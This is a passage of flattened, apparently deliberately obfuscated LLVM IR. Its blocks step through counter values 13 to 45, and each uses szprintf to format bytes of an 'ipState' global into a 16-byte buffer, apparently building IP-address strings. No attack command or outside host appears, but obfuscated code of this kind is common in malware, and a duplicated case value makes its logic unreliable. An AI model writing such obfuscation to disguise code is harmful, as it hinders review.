  %158 = call i32 (i8*, i8*, ...) @szprintf(i8* %153, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.54, i32 0, i32 0), i32 %155, i32 %157)
  store i32 1389896609, i32* %switchVar
  br label %loopEnd

; <label>:159:                                    ; preds = %loopEntry
  %160 = load i32, i32* %1, align 4
  %161 = icmp eq i32 %160, 13
  %162 = select i1 %161, i32 958165478, i32 -1765274226
  store i32 %162, i32* %switchVar
  br label %loopEnd

; <label>:163:                                    ; preds = %loopEntry
  %164 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %165 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %166 = zext i8 %165 to i32
  %167 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %168 = zext i8 %167 to i32
  %169 = call i32 (i8*, i8*, ...) @szprintf(i8* %164, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.55, i32 0, i32 0), i32 %166, i32 %168)
  store i32 -1765274226, i32* %switchVar
  br label %loopEnd

; <label>:170:                                    ; preds = %loopEntry
  %171 = load i32, i32* %1, align 4
  %172 = icmp eq i32 %171, 14
  %173 = select i1 %172, i32 777639747, i32 -1642633517
  store i32 %173, i32* %switchVar
  br label %loopEnd

; <label>:174:                                    ; preds = %loopEntry
  %175 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %176 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %177 = zext i8 %176 to i32
  %178 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %179 = zext i8 %178 to i32
  %180 = call i32 (i8*, i8*, ...) @szprintf(i8* %175, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.56, i32 0, i32 0), i32 %177, i32 %179)
  store i32 -1642633517, i32* %switchVar
  br label %loopEnd

; <label>:181:                                    ; preds = %loopEntry
  %182 = load i32, i32* %1, align 4
  %183 = icmp eq i32 %182, 15
  %184 = select i1 %183, i32 467155450, i32 1764361734
  store i32 %184, i32* %switchVar
  br label %loopEnd

; <label>:185:                                    ; preds = %loopEntry
  %186 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %187 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %188 = zext i8 %187 to i32
  %189 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %190 = zext i8 %189 to i32
  %191 = call i32 (i8*, i8*, ...) @szprintf(i8* %186, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.57, i32 0, i32 0), i32 %188, i32 %190)
  store i32 1764361734, i32* %switchVar
  br label %loopEnd

; <label>:192:                                    ; preds = %loopEntry
  %193 = load i32, i32* %1, align 4
  %194 = icmp eq i32 %193, 16
  %195 = select i1 %194, i32 -1789894340, i32 -2079131367
  store i32 %195, i32* %switchVar
  br label %loopEnd

; <label>:196:                                    ; preds = %loopEntry
  %197 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %198 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %199 = zext i8 %198 to i32
  %200 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %201 = zext i8 %200 to i32
  %202 = call i32 (i8*, i8*, ...) @szprintf(i8* %197, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.58, i32 0, i32 0), i32 %199, i32 %201)
  store i32 -2079131367, i32* %switchVar
  br label %loopEnd

; <label>:203:                                    ; preds = %loopEntry
  %204 = load i32, i32* %1, align 4
  %205 = icmp eq i32 %204, 17
  %206 = select i1 %205, i32 -103657637, i32 -159211952
  store i32 %206, i32* %switchVar
  br label %loopEnd

; <label>:207:                                    ; preds = %loopEntry
  %208 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %209 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %210 = zext i8 %209 to i32
  %211 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %212 = zext i8 %211 to i32
  %213 = call i32 (i8*, i8*, ...) @szprintf(i8* %208, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.59, i32 0, i32 0), i32 %210, i32 %212)
  store i32 -159211952, i32* %switchVar
  br label %loopEnd

; <label>:214:                                    ; preds = %loopEntry
  %215 = load i32, i32* %1, align 4
  %216 = icmp eq i32 %215, 18
  %217 = select i1 %216, i32 -356546906, i32 1105962159
  store i32 %217, i32* %switchVar
  br label %loopEnd

; <label>:218:                                    ; preds = %loopEntry
  %219 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %220 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %221 = zext i8 %220 to i32
  %222 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %223 = zext i8 %222 to i32
  %224 = call i32 (i8*, i8*, ...) @szprintf(i8* %219, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.60, i32 0, i32 0), i32 %221, i32 %223)
  store i32 1105962159, i32* %switchVar
  br label %loopEnd

; <label>:225:                                    ; preds = %loopEntry
  %226 = load i32, i32* %1, align 4
  %227 = icmp eq i32 %226, 19
  %228 = select i1 %227, i32 1129688245, i32 -886811160
  store i32 %228, i32* %switchVar
  br label %loopEnd

; <label>:229:                                    ; preds = %loopEntry
  %230 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %231 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %232 = zext i8 %231 to i32
  %233 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %234 = zext i8 %233 to i32
  %235 = call i32 (i8*, i8*, ...) @szprintf(i8* %230, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.61, i32 0, i32 0), i32 %232, i32 %234)
  store i32 -886811160, i32* %switchVar
  br label %loopEnd

; <label>:236:                                    ; preds = %loopEntry
  %237 = load i32, i32* %1, align 4
  %238 = icmp eq i32 %237, 20
  %239 = select i1 %238, i32 976162565, i32 1910526486
  store i32 %239, i32* %switchVar
  br label %loopEnd

; <label>:240:                                    ; preds = %loopEntry
  %241 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %242 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %243 = zext i8 %242 to i32
  %244 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %245 = zext i8 %244 to i32
  %246 = call i32 (i8*, i8*, ...) @szprintf(i8* %241, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.62, i32 0, i32 0), i32 %243, i32 %245)
  store i32 1910526486, i32* %switchVar
  br label %loopEnd

; <label>:247:                                    ; preds = %loopEntry
  %248 = load i32, i32* %1, align 4
  %249 = icmp eq i32 %248, 21
  %250 = select i1 %249, i32 -1207796969, i32 1173014218
  store i32 %250, i32* %switchVar
  br label %loopEnd

; <label>:251:                                    ; preds = %loopEntry
  %252 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %253 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %254 = zext i8 %253 to i32
  %255 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %256 = zext i8 %255 to i32
  %257 = call i32 (i8*, i8*, ...) @szprintf(i8* %252, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.63, i32 0, i32 0), i32 %254, i32 %256)
  store i32 1173014218, i32* %switchVar
  br label %loopEnd

; <label>:258:                                    ; preds = %loopEntry
  %259 = load i32, i32* %1, align 4
  %260 = icmp eq i32 %259, 22
  %261 = select i1 %260, i32 936446353, i32 -404863654
  store i32 %261, i32* %switchVar
  br label %loopEnd

; <label>:262:                                    ; preds = %loopEntry
  %263 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %264 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %265 = zext i8 %264 to i32
  %266 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %267 = zext i8 %266 to i32
  %268 = call i32 (i8*, i8*, ...) @szprintf(i8* %263, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.64, i32 0, i32 0), i32 %265, i32 %267)
  store i32 -404863654, i32* %switchVar
  br label %loopEnd

; <label>:269:                                    ; preds = %loopEntry
  %270 = load i32, i32* %1, align 4
  %271 = icmp eq i32 %270, 23
  %272 = select i1 %271, i32 -1454595438, i32 1201099970
  store i32 %272, i32* %switchVar
  br label %loopEnd

; <label>:273:                                    ; preds = %loopEntry
  %274 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %275 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %276 = zext i8 %275 to i32
  %277 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %278 = zext i8 %277 to i32
  %279 = call i32 (i8*, i8*, ...) @szprintf(i8* %274, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.65, i32 0, i32 0), i32 %276, i32 %278)
  store i32 1201099970, i32* %switchVar
  br label %loopEnd

; <label>:280:                                    ; preds = %loopEntry
  %281 = load i32, i32* %1, align 4
  %282 = icmp eq i32 %281, 24
  %283 = select i1 %282, i32 352318712, i32 -1232192400
  store i32 %283, i32* %switchVar
  br label %loopEnd

; <label>:284:                                    ; preds = %loopEntry
  %285 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %286 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %287 = zext i8 %286 to i32
  %288 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %289 = zext i8 %288 to i32
  %290 = call i32 (i8*, i8*, ...) @szprintf(i8* %285, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.66, i32 0, i32 0), i32 %287, i32 %289)
  store i32 -1232192400, i32* %switchVar
  br label %loopEnd

; <label>:291:                                    ; preds = %loopEntry
  %292 = load i32, i32* %1, align 4
  %293 = icmp eq i32 %292, 25
  %294 = select i1 %293, i32 -2060112404, i32 -40905400
  store i32 %294, i32* %switchVar
  br label %loopEnd

; <label>:295:                                    ; preds = %loopEntry
  %296 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %297 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %298 = zext i8 %297 to i32
  %299 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %300 = zext i8 %299 to i32
  %301 = call i32 (i8*, i8*, ...) @szprintf(i8* %296, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.67, i32 0, i32 0), i32 %298, i32 %300)
  store i32 -40905400, i32* %switchVar
  br label %loopEnd

; <label>:302:                                    ; preds = %loopEntry
  %303 = load i32, i32* %1, align 4
  %304 = icmp eq i32 %303, 26
  %305 = select i1 %304, i32 -273806587, i32 -1683055098
  store i32 %305, i32* %switchVar
  br label %loopEnd

; <label>:306:                                    ; preds = %loopEntry
  %307 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %308 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %309 = zext i8 %308 to i32
  %310 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %311 = zext i8 %310 to i32
  %312 = call i32 (i8*, i8*, ...) @szprintf(i8* %307, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.66, i32 0, i32 0), i32 %309, i32 %311)
  store i32 -1683055098, i32* %switchVar
  br label %loopEnd

; <label>:313:                                    ; preds = %loopEntry
  %314 = load i32, i32* %1, align 4
  %315 = icmp eq i32 %314, 27
  %316 = select i1 %315, i32 -1423342246, i32 -368445382
  store i32 %316, i32* %switchVar
  br label %loopEnd

; <label>:317:                                    ; preds = %loopEntry
  %318 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %319 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %320 = zext i8 %319 to i32
  %321 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %322 = zext i8 %321 to i32
  %323 = call i32 (i8*, i8*, ...) @szprintf(i8* %318, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.68, i32 0, i32 0), i32 %320, i32 %322)
  store i32 -368445382, i32* %switchVar
  br label %loopEnd

; <label>:324:                                    ; preds = %loopEntry
  %325 = load i32, i32* %1, align 4
  %326 = icmp eq i32 %325, 28
  %327 = select i1 %326, i32 223545483, i32 673366457
  store i32 %327, i32* %switchVar
  br label %loopEnd

; <label>:328:                                    ; preds = %loopEntry
  %329 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %330 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %331 = zext i8 %330 to i32
  %332 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %333 = zext i8 %332 to i32
  %334 = call i32 (i8*, i8*, ...) @szprintf(i8* %329, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i32 0, i32 0), i32 %331, i32 %333)
  store i32 673366457, i32* %switchVar
  br label %loopEnd

; <label>:335:                                    ; preds = %loopEntry
  %336 = load i32, i32* %1, align 4
  %337 = icmp eq i32 %336, 29
  %338 = select i1 %337, i32 1898664501, i32 528805526
  store i32 %338, i32* %switchVar
  br label %loopEnd

; <label>:339:                                    ; preds = %loopEntry
  %340 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %341 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %342 = zext i8 %341 to i32
  %343 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %344 = zext i8 %343 to i32
  %345 = call i32 (i8*, i8*, ...) @szprintf(i8* %340, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.70, i32 0, i32 0), i32 %342, i32 %344)
  store i32 528805526, i32* %switchVar
  br label %loopEnd

; <label>:346:                                    ; preds = %loopEntry
  %347 = load i32, i32* %1, align 4
  %348 = icmp eq i32 %347, 30
  %349 = select i1 %348, i32 -292611435, i32 1566831087
  store i32 %349, i32* %switchVar
  br label %loopEnd

; <label>:350:                                    ; preds = %loopEntry
  %351 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %352 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %353 = zext i8 %352 to i32
  %354 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %355 = zext i8 %354 to i32
  %356 = call i32 (i8*, i8*, ...) @szprintf(i8* %351, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.71, i32 0, i32 0), i32 %353, i32 %355)
  store i32 1566831087, i32* %switchVar
  br label %loopEnd

; <label>:357:                                    ; preds = %loopEntry
  %358 = load i32, i32* %1, align 4
  %359 = icmp eq i32 %358, 31
  %360 = select i1 %359, i32 1755088580, i32 -137530279
  store i32 %360, i32* %switchVar
  br label %loopEnd

; <label>:361:                                    ; preds = %loopEntry
  %362 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %363 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %364 = zext i8 %363 to i32
  %365 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %366 = zext i8 %365 to i32
  %367 = call i32 (i8*, i8*, ...) @szprintf(i8* %362, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.72, i32 0, i32 0), i32 %364, i32 %366)
  store i32 -137530279, i32* %switchVar
  br label %loopEnd

; <label>:368:                                    ; preds = %loopEntry
  %369 = load i32, i32* %1, align 4
  %370 = icmp eq i32 %369, 32
  %371 = select i1 %370, i32 1467803225, i32 1945302362
  store i32 %371, i32* %switchVar
  br label %loopEnd

; <label>:372:                                    ; preds = %loopEntry
  %373 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %374 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %375 = zext i8 %374 to i32
  %376 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %377 = zext i8 %376 to i32
  %378 = call i32 (i8*, i8*, ...) @szprintf(i8* %373, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.73, i32 0, i32 0), i32 %375, i32 %377)
  store i32 1945302362, i32* %switchVar
  br label %loopEnd

; <label>:379:                                    ; preds = %loopEntry
  %380 = load i32, i32* %1, align 4
  %381 = icmp eq i32 %380, 33
  %382 = select i1 %381, i32 -1040550795, i32 1728803074
  store i32 %382, i32* %switchVar
  br label %loopEnd

; <label>:383:                                    ; preds = %loopEntry
  %384 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %385 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %386 = zext i8 %385 to i32
  %387 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %388 = zext i8 %387 to i32
  %389 = call i32 (i8*, i8*, ...) @szprintf(i8* %384, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.74, i32 0, i32 0), i32 %386, i32 %388)
  store i32 1728803074, i32* %switchVar
  br label %loopEnd

; <label>:390:                                    ; preds = %loopEntry
  %391 = load i32, i32* %1, align 4
  %392 = icmp eq i32 %391, 34
  %393 = select i1 %392, i32 -1352425973, i32 420427610
  store i32 %393, i32* %switchVar
  br label %loopEnd

; <label>:394:                                    ; preds = %loopEntry
  %395 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %396 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %397 = zext i8 %396 to i32
  %398 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %399 = zext i8 %398 to i32
  %400 = call i32 (i8*, i8*, ...) @szprintf(i8* %395, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.75, i32 0, i32 0), i32 %397, i32 %399)
  store i32 420427610, i32* %switchVar
  br label %loopEnd

; <label>:401:                                    ; preds = %loopEntry
  %402 = load i32, i32* %1, align 4
  %403 = icmp eq i32 %402, 34
  %404 = select i1 %403, i32 -1389790310, i32 363768484
  store i32 %404, i32* %switchVar
  br label %loopEnd

; <label>:405:                                    ; preds = %loopEntry
  %406 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %407 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %408 = zext i8 %407 to i32
  %409 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %410 = zext i8 %409 to i32
  %411 = call i32 (i8*, i8*, ...) @szprintf(i8* %406, i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.76, i32 0, i32 0), i32 %408, i32 %410)
  store i32 363768484, i32* %switchVar
  br label %loopEnd

; <label>:412:                                    ; preds = %loopEntry
  %413 = load i32, i32* %1, align 4
  %414 = icmp eq i32 %413, 35
  %415 = select i1 %414, i32 -1695849817, i32 734359048
  store i32 %415, i32* %switchVar
  br label %loopEnd

; <label>:416:                                    ; preds = %loopEntry
  %417 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %418 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %419 = zext i8 %418 to i32
  %420 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %421 = zext i8 %420 to i32
  %422 = call i32 (i8*, i8*, ...) @szprintf(i8* %417, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.77, i32 0, i32 0), i32 %419, i32 %421)
  store i32 734359048, i32* %switchVar
  br label %loopEnd

; <label>:423:                                    ; preds = %loopEntry
  %424 = load i32, i32* %1, align 4
  %425 = icmp eq i32 %424, 36
  %426 = select i1 %425, i32 371110222, i32 780758948
  store i32 %426, i32* %switchVar
  br label %loopEnd

; <label>:427:                                    ; preds = %loopEntry
  %428 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %429 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %430 = zext i8 %429 to i32
  %431 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %432 = zext i8 %431 to i32
  %433 = call i32 (i8*, i8*, ...) @szprintf(i8* %428, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.78, i32 0, i32 0), i32 %430, i32 %432)
  store i32 780758948, i32* %switchVar
  br label %loopEnd

; <label>:434:                                    ; preds = %loopEntry
  %435 = load i32, i32* %1, align 4
  %436 = icmp eq i32 %435, 37
  %437 = select i1 %436, i32 1764660162, i32 1565126155
  store i32 %437, i32* %switchVar
  br label %loopEnd

; <label>:438:                                    ; preds = %loopEntry
  %439 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %440 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %441 = zext i8 %440 to i32
  %442 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %443 = zext i8 %442 to i32
  %444 = call i32 (i8*, i8*, ...) @szprintf(i8* %439, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.79, i32 0, i32 0), i32 %441, i32 %443)
  store i32 1565126155, i32* %switchVar
  br label %loopEnd

; <label>:445:                                    ; preds = %loopEntry
  %446 = load i32, i32* %1, align 4
  %447 = icmp eq i32 %446, 38
  %448 = select i1 %447, i32 -1511690522, i32 -903986680
  store i32 %448, i32* %switchVar
  br label %loopEnd

; <label>:449:                                    ; preds = %loopEntry
  %450 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %451 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %452 = zext i8 %451 to i32
  %453 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %454 = zext i8 %453 to i32
  %455 = call i32 (i8*, i8*, ...) @szprintf(i8* %450, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.80, i32 0, i32 0), i32 %452, i32 %454)
  store i32 -903986680, i32* %switchVar
  br label %loopEnd

; <label>:456:                                    ; preds = %loopEntry
  %457 = load i32, i32* %1, align 4
  %458 = icmp eq i32 %457, 39
  %459 = select i1 %458, i32 943527825, i32 644487590
  store i32 %459, i32* %switchVar
  br label %loopEnd

; <label>:460:                                    ; preds = %loopEntry
  %461 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %462 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %463 = zext i8 %462 to i32
  %464 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %465 = zext i8 %464 to i32
  %466 = call i32 (i8*, i8*, ...) @szprintf(i8* %461, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.81, i32 0, i32 0), i32 %463, i32 %465)
  store i32 644487590, i32* %switchVar
  br label %loopEnd

; <label>:467:                                    ; preds = %loopEntry
  %468 = load i32, i32* %1, align 4
  %469 = icmp eq i32 %468, 40
  %470 = select i1 %469, i32 -1913070330, i32 810371470
  store i32 %470, i32* %switchVar
  br label %loopEnd

; <label>:471:                                    ; preds = %loopEntry
  %472 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %473 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %474 = zext i8 %473 to i32
  %475 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %476 = zext i8 %475 to i32
  %477 = call i32 (i8*, i8*, ...) @szprintf(i8* %472, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.82, i32 0, i32 0), i32 %474, i32 %476)
  store i32 810371470, i32* %switchVar
  br label %loopEnd

; <label>:478:                                    ; preds = %loopEntry
  %479 = load i32, i32* %1, align 4
  %480 = icmp eq i32 %479, 41
  %481 = select i1 %480, i32 -164461558, i32 374570161
  store i32 %481, i32* %switchVar
  br label %loopEnd

; <label>:482:                                    ; preds = %loopEntry
  %483 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %484 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %485 = zext i8 %484 to i32
  %486 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %487 = zext i8 %486 to i32
  %488 = call i32 (i8*, i8*, ...) @szprintf(i8* %483, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.83, i32 0, i32 0), i32 %485, i32 %487)
  store i32 374570161, i32* %switchVar
  br label %loopEnd

; <label>:489:                                    ; preds = %loopEntry
  %490 = load i32, i32* %1, align 4
  %491 = icmp eq i32 %490, 42
  %492 = select i1 %491, i32 -1090793613, i32 1886963637
  store i32 %492, i32* %switchVar
  br label %loopEnd

; <label>:493:                                    ; preds = %loopEntry
  %494 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %495 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %496 = zext i8 %495 to i32
  %497 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %498 = zext i8 %497 to i32
  %499 = call i32 (i8*, i8*, ...) @szprintf(i8* %494, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.84, i32 0, i32 0), i32 %496, i32 %498)
  store i32 1886963637, i32* %switchVar
  br label %loopEnd

; <label>:500:                                    ; preds = %loopEntry
  %501 = load i32, i32* %1, align 4
  %502 = icmp eq i32 %501, 43
  %503 = select i1 %502, i32 1612336463, i32 56089614
  store i32 %503, i32* %switchVar
  br label %loopEnd

; <label>:504:                                    ; preds = %loopEntry
  %505 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %506 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %507 = zext i8 %506 to i32
  %508 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %509 = zext i8 %508 to i32
  %510 = call i32 (i8*, i8*, ...) @szprintf(i8* %505, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.85, i32 0, i32 0), i32 %507, i32 %509)
  store i32 56089614, i32* %switchVar
  br label %loopEnd

; <label>:511:                                    ; preds = %loopEntry
  %512 = load i32, i32* %1, align 4
  %513 = icmp eq i32 %512, 44
  %514 = select i1 %513, i32 627377371, i32 93877066
  store i32 %514, i32* %switchVar
  br label %loopEnd

; <label>:515:                                    ; preds = %loopEntry
  %516 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %517 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %518 = zext i8 %517 to i32
  %519 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %520 = zext i8 %519 to i32
  %521 = call i32 (i8*, i8*, ...) @szprintf(i8* %516, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.86, i32 0, i32 0), i32 %518, i32 %520)
  store i32 93877066, i32* %switchVar
  br label %loopEnd

; <label>:522:                                    ; preds = %loopEntry
  %523 = load i32, i32* %1, align 4
  %524 = icmp eq i32 %523, 45
  %525 = select i1 %524, i32 -1117879484, i32 1778404666
  store i32 %525, i32* %switchVar
  br label %loopEnd

; <label>:526:                                    ; preds = %loopEntry
  %527 = getelementptr inbounds [16 x i8], [16 x i8]* %2, i32 0, i32 0
  %528 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
